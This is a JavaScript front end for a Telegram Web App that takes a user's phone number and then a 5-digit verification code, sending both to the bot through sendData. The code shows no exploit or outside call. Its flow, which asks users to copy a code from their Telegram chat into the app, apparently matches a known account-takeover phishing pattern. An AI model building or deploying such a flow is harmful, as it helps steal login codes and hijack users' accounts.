document.addEventListener('DOMContentLoaded', function() {
    const tg = window.Telegram.WebApp;
    const phoneSection = document.getElementById('phone-section');
    const otpSection = document.getElementById('otp-section');
    const phoneInput = document.getElementById('phone-input');
    const sendOtpBtn = document.getElementById('send-otp-btn');
    const otpBoxes = document.querySelectorAll('.otp-box');
    const keys = document.querySelectorAll('.key');
    const verifyBtn = document.getElementById('verify-btn');
    
    let currentIndex = 0;
    let currentStep = 'phone'; // 'phone' or 'otp'
    
    // Initialize Telegram Web App - Keep it open!
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation();
    
    // --- Phone Step ---
    sendOtpBtn.addEventListener('click', function() {
        const phone = phoneInput.value.trim();
        
        if (phone.length < 10) {
            tg.showPopup({
                title: 'Error',
                message: 'Please enter a valid phone number!',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
            return;
        }
        
        // Send request to bot to send OTP
        if (tg) {
            tg.MainButton.setText('Sending...');
            tg.MainButton.show();
            tg.MainButton.disable();
            tg.sendData('send_otp:' + phone);
            
            // Show OTP section after a short delay
            setTimeout(() => {
                tg.MainButton.hide();
                showOtpSection();
                tg.showPopup({
                    title: 'Code Sent!',
                    message: 'Check your Telegram chat for the verification code!',
                    buttons: [{ type: 'ok', text: 'OK' }]
                });
            }, 800);
        }
    });
    
    // --- OTP Step ---
    function showOtpSection() {
        phoneSection.style.display = 'none';
        otpSection.style.display = 'block';
        document.querySelector('.emoji-center .emoji').textContent = '🔢';
        currentStep = 'otp';
        otpBoxes[0].focus();
    }
    
    function focusNextBox() {
        if (currentIndex < otpBoxes.length - 1) {
            currentIndex++;
            otpBoxes[currentIndex].focus();
        }
    }
    
    function focusPrevBox() {
        if (currentIndex > 0) {
            currentIndex--;
            otpBoxes[currentIndex].focus();
        }
    }
    
    function handleKeyPress(key) {
        if (key === 'backspace') {
            otpBoxes[currentIndex].value = '';
            focusPrevBox();
        } else if (!isNaN(key)) {
            otpBoxes[currentIndex].value = key;
            focusNextBox();
        }
    }
    
    // OTP Input Handlers
    otpBoxes.forEach((box, index) => {
        box.addEventListener('input', function(e) {
            if (this.value.length === 1) {
                focusNextBox();
            }
        });
        
        box.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '') {
                focusPrevBox();
            }
        });
    });
    
    // Keypad Handlers
    keys.forEach(key => {
        key.addEventListener('click', function() {
            const keyValue = this.dataset.key;
            handleKeyPress(keyValue);
        });
    });
    
    // Verify OTP Button
    verifyBtn.addEventListener('click', function() {
        const otp = Array.from(otpBoxes).map(box => box.value).join('');
        if (otp.length === 5) {
            if (tg) {
                tg.MainButton.setText('Verifying...');
                tg.MainButton.show();
                tg.MainButton.disable();
                tg.sendData('verify_otp:' + otp);
            }
        } else {
            tg.showPopup({
                title: 'Error',
                message: 'Please enter a complete 5-digit OTP!',
                buttons: [{ type: 'ok', text: 'OK' }]
            });
        }
    });
    
    // Focus first input if we're on phone step
    if (currentStep === 'phone') {
        phoneInput.focus();
    }
});
